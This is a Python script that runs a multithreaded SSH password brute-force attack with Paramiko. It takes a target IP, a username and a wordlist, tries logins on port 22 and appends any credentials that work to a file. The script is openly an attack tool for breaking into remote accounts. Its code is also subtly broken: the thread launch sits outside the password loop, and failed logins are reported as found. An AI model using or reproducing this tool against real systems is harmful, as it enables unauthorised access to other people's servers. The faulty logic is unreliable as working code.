# Paramiko: Secure SSH library for Python remote device management.

import ipaddress
import threading
import time
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import pyfiglet

# This function is responsible for the ssh client connecting.
# Successful authentication will return a code 0, a failed authentication will return a code 1.
def ssh_connect(target, username, password):
    ssh = SSHClient()
    # Set the host policies. We add the new hostname and host key to the local HostKeys object.
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    try:
        # We attemp to connect to the host
        ssh.connect(target, password=password, username=username, port=22)
        with open("crendetials_found.txt", 'a') as f:
            # we write the creandials that worked to a file.
            print(f"Username - {username} and Password - {password} found.")
            f.write(f"Username: {username}\nPassword: {password}\nWorked on host {target}\n")
    except AuthenticationException:
        print(f"Username - {username} and password - {password} found.")            
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")

# This function gets a valid IP address from the user.     
def get_ip_address():
    target = input("Please enter the target ip address: ")
    try:
        # Check if target is a valid IPv4 address. If so we return target.
        ipaddress.IPv4Address(target)
        return target
    except ipaddress.AddressValueError:
        # If host is not a valid IPv4 address we send the message that the user should enter a valid ip address.
        print("Please enter a valid ip address.")


# The program will start in the main function.
def __main__():
    
    ascii_banner = pyfiglet.figlet_format("X1-SSH Brute Forcing")
    print(ascii_banner)
    target = get_ip_address()
    username = input("Please enter the username :")
    password_file = input("please enter location of the password file : ")
    
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()
        #  We create a thread on the ssh_connect function, and send the correct arguments to it.
        t = threading.Thread(target=ssh_connect, args=(target, username,password,))
        # We start the thread.
        t.start()
        # We leave a small time between starting a new connection thread.
        time.sleep(0.02)
        # ssh_connect(target, username, password)

__main__()
        
        
